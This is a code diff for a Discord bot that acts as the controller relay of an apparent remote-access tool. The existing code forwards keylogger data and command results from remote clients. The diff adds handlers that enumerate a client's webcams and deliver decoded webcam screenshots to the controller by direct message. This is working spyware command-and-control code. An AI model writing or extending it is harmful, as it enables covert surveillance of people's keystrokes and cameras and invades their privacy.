@@ -1,17 +1,21 @@
 import { type DiscordClient } from "@/clients/DiscordClient";
 import { embeds, emojis } from "@/shared";
 import { Logger } from "@/shared/Logger";
-import {
-	type GetCmdCommand,
-	type WsTasksFromClient,
-	type MessageEvent,
-	type KeyLoggerEvent
+import type {
+	GetCmdCommand,
+	WsTasksFromClient,
+	MessageEvent,
+	KeyLoggerEvent,
+	AddFriendEvent,
+	GetWebcamsEvent,
+	GetWebcamScreenshotEvent
 } from "@/types/ws-events.types";
 import { type Process } from "@/types/ws.types";
 import { fromBytesToMB } from "@/utils";
+import { ActionRowBuilder, Attachment, AttachmentBuilder, ButtonBuilder, ButtonStyle } from "discord.js";
 
 export class WsOthersEvents {
-	constructor(private readonly client: DiscordClient) {}
+	constructor(private readonly client: DiscordClient) { }
 
 	getTasksFromClient = async (data: WsTasksFromClient) => {
 		const { tasks, controllerid } = data;
@@ -149,4 +153,70 @@ export class WsOthersEvents {
 			Logger.error("Error sending keylogger data", error);
 		}
 	};
+
+	addFriend = async (data: AddFriendEvent) => {
+		const { controllerid, clientid, accept } = data;
+		Logger.info("Add friend event received", JSON.stringify(data));
+		const embed = {
+			title: "Add client status",
+			description: `${accept ? emojis.Success : emojis.Error} Client ${clientid} has **${accept ? "accepted" : "rejected"
+				}** your friend request.`,
+			color: embeds.Colors.default,
+		};
+
+		try {
+
+			const owner = await this.client.users.fetch(controllerid);
+
+			await owner.send({ embeds: [embed] });
+
+		} catch (error) {
+			Logger.error("Error sending add friend data", error);
+		}
+
+
+	}
+
+	getWebcams = async (data: GetWebcamsEvent) => {
+		const { controllerid, webcams, messageid } = data;
+
+		Logger.info("Get webcams event received", messageid, webcams);
+
+		const owner = await this.client.users.fetch(controllerid);
+		const dmChannel = await owner.createDM();
+
+		const buttons = webcams.map((webcam, idx) => {
+			const button = new ButtonBuilder()
+				.setCustomId(`webcam-${webcam.id}-${messageid}`)
+				.setLabel(webcam.name)
+				.setStyle(ButtonStyle.Secondary);
+			return button;
+		});
+
+		const row = new ActionRowBuilder<ButtonBuilder>().addComponents(buttons);
+
+		await dmChannel.messages.fetch(messageid).then(async (message) => {
+			if (!message) return console.log("No message found.");
+			// await message.delete();
+			await message.edit({
+				content: `Select a webcam`,
+				components: [row]
+			});
+		});
+	}
+
+	getWebcamScreenshot = async (data: GetWebcamScreenshotEvent) => {
+
+		const { controllerid, screenshot } = data
+
+		const owner = await this.client.users.fetch(controllerid);
+		const imageStream = Buffer.from(screenshot.split(',')[1], 'base64');
+		const attachment = new AttachmentBuilder(imageStream, {
+			name: "output.png"
+		})
+
+		await owner.send({
+			files: [attachment]
+		});
+	}
 }
